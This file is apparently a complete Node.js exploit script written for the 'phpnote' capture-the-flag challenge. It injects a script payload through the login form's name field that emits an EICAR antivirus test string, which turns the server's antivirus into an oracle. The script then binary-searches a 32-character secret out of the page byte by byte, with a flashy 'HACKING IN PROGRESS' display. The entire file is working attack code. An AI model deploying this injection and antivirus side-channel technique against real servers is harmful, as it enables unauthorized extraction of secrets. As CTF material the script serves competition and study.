const fetch = require("isomorphic-fetch");

const getTestString = (pos, v) => {
	return `<script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H'+{${v}:'*'}[Math.min(n,${v})])};f(document.body.innerHTML.charCodeAt(${pos}));</script><body>`;
}

async function ft(url, options) {
	while (true) {
		try {
			return await fetch(url, options);
		} catch {}
	}
}

async function test(position, char) {
	let response0 = await ft(
		"http://phpnote.chal.ctf.westerns.tokyo/?action=index", {
			method: "GET"
		}
	);

	let cookie = response0.headers.get("set-cookie").split(";")[0];
	let realname = encodeURIComponent(getTestString(position, char));

	await ft(
		"http://phpnote.chal.ctf.westerns.tokyo/?action=login", {
			method: "POST",
			headers: {
				"Content-Type": "application/x-www-form-urlencoded",
				"Cookie": cookie
			},
			body: `realname=therealestname&nickname=`
		}
	);

	await ft(
		"http://phpnote.chal.ctf.westerns.tokyo/?action=login", {
			method: "POST",
			headers: {
				"Content-Type": "application/x-www-form-urlencoded",
				"Cookie": cookie
			},
			body: `realname=${realname}&nickname=${encodeURIComponent("</body>zach")}`
		}
	);

	let response2 = await fetch(
		"http://phpnote.chal.ctf.westerns.tokyo/?action=index", {
			method: "GET",
			headers: {
				"Cookie": cookie
			}
		}
	);

	let index = await response2.text();

	if (index.indexOf("EICAR") >= 0) {
		return false;
	} else {
		return true;
	}
}

async function binsearch(pos) {
	let lo = 0;
	let hi = 255;

	while (lo < hi) {
		let mid = Math.ceil((lo + hi) / 2);

		if (await test(pos+15, mid)) {
			lo = mid;
		} else {
			hi = mid - 1;
		}

		ranges[pos] = [lo, hi];
	}

	return lo;
}

let n = 32;
let ranges = Array.from(new Array(n), () => [0, 255]);

async function cycleBackground() {
	while (true) {
		await new Promise((r) => setTimeout(r, 50));
		process.stdout.write("\r" + ranges.map(([lo, hi]) => {
			let out = charToPlaintext(Math.floor(Math.random() * (hi - lo + 1) + lo));
			let colors = [
				[128, 160, false],
				[64, 166, false],
				[32, 172, false],
				[16, 178, false],
				[8, 184, false],
				[4, 190, false],
				[2, 82, false],
				[1, 76, false],
				[0, 70, true]
			];
			for ([threshold, color, bold] of colors.reverse()) {
				if (hi - lo <= threshold) {
					return `${bold ? "\x1b[1m" : ""}\x1b[38;5;${color}m${out}\x1b[0m`;
				}
			}
		}).join("").replace("\n", ""));
	}
}

function charToPlaintext(char) {
	if (char === 0) {
		return "x";
	}

	if (char === 9) {
		return "x";
	}

	if (char === 10) {
		return "x";
	}

	if (char === 13) {
		return "x";
	}

	return 32 <= char && char <= 126 ? String.fromCharCode(char) : "\u2022";
}

async function run() {
	cycleBackground();
	console.log("\x1b[33m\x1b[5mHACKING IN PROGRESS\x1b[0m");
	await Promise.all(Array.from(new Array(n), async (_, i) => {
		await binsearch(i);
	}));
	setTimeout(() => {
		console.log("\n\x1b[42m\x1b[39mACCESS GRANTED\x1b[0m");
		process.exit(0);
	}, 100);
}

run();
